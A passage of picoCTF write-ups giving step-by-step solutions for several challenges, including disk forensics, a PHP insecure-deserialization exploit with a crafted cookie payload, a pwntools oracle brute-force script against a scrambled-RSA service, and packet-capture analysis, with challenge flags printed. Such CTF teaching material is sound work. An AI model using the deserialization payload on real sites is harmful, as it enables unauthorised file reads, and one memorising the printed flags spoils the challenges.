d/d 16258:      proc
d/d 18290:      root # root has the highest permission
d/d 16259:      run
d/d 18292:      sbin
d/d 12222:      srv
d/d 16260:      sys
d/d 18369:      tmp
d/d 12223:      usr
d/d 14229:      var
V/V 32513:      $OrphanFiles
```
4. ` fls -o 2048 dds2-alpine.flag.img 18290` and you'll get this `r/r 18291:      down-at-the-bottom.txt`
5. `icat -o 2048 dds2-alpine.flag.img 18291`
```python=
   _     _     _     _     _     _     _     _     _     _     _     _     _  
  / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \ 
 ( p ) ( i ) ( c ) ( o ) ( C ) ( T ) ( F ) ( { ) ( f ) ( 0 ) ( r ) ( 3 ) ( n )
  \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/ 
   _     _     _     _     _     _     _     _     _     _     _     _     _  
  / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \ 
 ( s ) ( 1 ) ( c ) ( 4 ) ( t ) ( 0 ) ( r ) ( _ ) ( n ) ( 0 ) ( v ) ( 1 ) ( c )
  \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/ 
   _     _     _     _     _     _     _     _     _     _     _  
  / \   / \   / \   / \   / \   / \   / \   / \   / \   / \   / \ 
 ( 3 ) ( _ ) ( d ) ( b ) ( 5 ) ( 9 ) ( d ) ( a ) ( a ) ( 5 ) ( } )
  \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/ 
```





### Useful Stuffs
1. https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Forensics/Disk%2C%20disk%2C%20sleuth!%20II/Disk%2C%20disk%2C%20sleuth!%20II.md
2. https://www.w3help.cc/a/202109/844043.html
3. https://www.sleuthkit.org/sleuthkit/man/icat.html
4. http://www.sleuthkit.org/sleuthkit/man/mmls.html

## Super Serial
![](https://i.imgur.com/QSPBhEp.png)

### Hints
1. The flag is at ../flag

### Solution by steps
1. `curl -s http://mercury.picoctf.net:25395/index.phps`
```php=
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
        $con = new SQLite3("../users.db");
        $username = $_POST["user"];
        $password = $_POST["pass"];
        $perm_res = new permissions($username, $password);
        if ($perm_res->is_guest() || $perm_res->is_admin()) {
                setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
                header("Location: authentication.php");
                die();
        } else {
                $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
        }
}
?>...
```
2. `curl -s http://mercury.picoctf.net:25395/cookie.phps`
```php=
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>

```
3. `curl -s http://mercury.picoctf.net:25395/authentication.php`
```php=
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>...
```
4. Use [Online php compiler](https://onecompiler.com/php/3yae7dhg3) and run
```php=
<?php
class access_log{
  public $log_file = "../flag";
}

print(urlencode(base64_encode(serialize(new access_log()))))
?>
```
5. Run `curl http://mercury.picoctf.net:25395/authentication.php -H "Cookie: login=THINGS_YOU_GET_ABOVE"` to get your flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Super_Serial.md

## Scrambled: RSA (SUPER HARD)
![](https://i.imgur.com/GFnP3ma.png)

### Hints
1. Look at the ciphertext, anything fishy, maybe a little bit long?
2. What happens if you encrypt the same input multiple times?
3. Is RSA deterministic, why would outputs vary?

### Solution by steps
1. Run `nc mercury.picoctf.net 61477` and get a flag, e and n
2. Test `a`,`ab`,`abc` and find out how the same letter reacts in different situations
3. `vim solve.py` and write down
```python=
#!/usr/bin/env python
from pwn import *
import string
from tqdm import tqdm

host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 61477)

io = connect(host, port)

io.recvuntil("flag: ")
encrypted_flag = io.recvuntil("\nn: ").decode().strip()
n = io.recvuntil("\ne: ").decode().strip()
e = io.recvuntil("\n").decode().strip()

def remove_segments(result, segments):
    # Remove all previously seen segments.
    for segment in segments:
        result = result.replace(segment, "")
    return result

known_segments = []
decrypted_flag = ""
while "}" not in decrypted_flag:
    for c in string.printable:
        current_test = decrypted_flag + c
        io.sendlineafter("I will encrypt whatever you give me: ", current_test)
        current_encrypt_test = io.recvuntil("\n").decode().strip()
        current_encrypt_test = current_encrypt_test.replace("Here you go: ", "")

        current_char_rep = remove_segments(current_encrypt_test, known_segments)

        if current_char_rep in encrypted_flag:
            print("New Letter Found: %s+[%s]" % (decrypted_flag, c))
            decrypted_flag += c
            known_segments.append(current_char_rep)
            break

print("Complete Flag: %s" % decrypted_flag)
```
4. Press `:wq` to exit and run `python solve.py` to get the string

### Useful Stuffs
1. https://github.com/HHousen/PicoCTF-2021/tree/master/Cryptography/Scrambled:%20RSA
2. https://www.youtube.com/watch?v=CEvUSE6LgGI&ab_channel=MartinCarlisle

## So Meta
![](https://i.imgur.com/q8IHGHE.png)

### Hints
1. What does meta mean in the context of files?
2. Ever heard of metadata?

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/89b371a46702a31aa9931a2a2b12f8bf/pico_img.png`
2. Run `exiftool pico_img.png` and you'll get your flag

### Useful Stuffs
1. https://www.linuxadictos.com/zh-TW/exiftool-visualiza-los-datos-exif-de-tus-imagenes-desde-la-terminal.html

## shark on wire 1
![](https://i.imgur.com/5DkNVPP.png)

### Hints
1. Try using a tool like Wireshark
2. What are streams?

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/483e50268fe7e015c49caf51a69063d0/capture.pcap`
2. `tshark -r capture.pcap | head`
```python
    1   0.000000  192.168.2.1 → 239.255.255.250 SSDP 216 M-SEARCH * HTTP/1.1 
    2   1.000498  192.168.2.1 → 239.255.255.250 SSDP 216 M-SEARCH * HTTP/1.1 
    3   2.001016  192.168.2.1 → 239.255.255.250 SSDP 216 M-SEARCH * HTTP/1.1 
    4   3.002419  192.168.2.1 → 239.255.255.250 SSDP 216 M-SEARCH * HTTP/1.1 
    5  14.589681  192.168.2.1 → 192.168.2.255 BROWSER 243 Local Master Announcement LAPTOP-HCSFMST7, Workstation, Server, NT Workstation, Potential Browser, Master Browser
    6  21.094272 fe80::8dd3:64c9:4ef3:82a3 → ff02::1:3    LLMNR 84 Standard query 0x724e A wpad
    7  21.094285  192.168.2.1 → 224.0.0.252  LLMNR 64 Standard query 0x724e A wpad
    8  21.506682 fe80::8dd3:64c9:4ef3:82a3 → ff02::1:3    LLMNR 84 Standard query 0x724e A wpad
    9  21.506697  192.168.2.1 → 224.0.0.252  LLMNR 64 Standard query 0x724e A wpad
   10  35.861119 VMware_b9:02:a9 → Broadcast    ARP 60 Who has 10.0.0.5? Tell 10.0.0.6
```
4. Run `PCAP=capture.pcap; END=$(tshark -r $PCAP -T fields -e udp.stream | sort -n | tail -1); for ((i=0;i<=END;i++)); do tshark -r $PCAP -Y "udp.stream eq $i" -T fields -e data.text -o data.show_as_text:TRUE 2>/dev/null | tr -d '\n' | grep "picoCTF"; if [ $? -eq 0 ]; then echo "(Stream #$i)"; fi; done` and get your flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/shark_on_wire_1.md

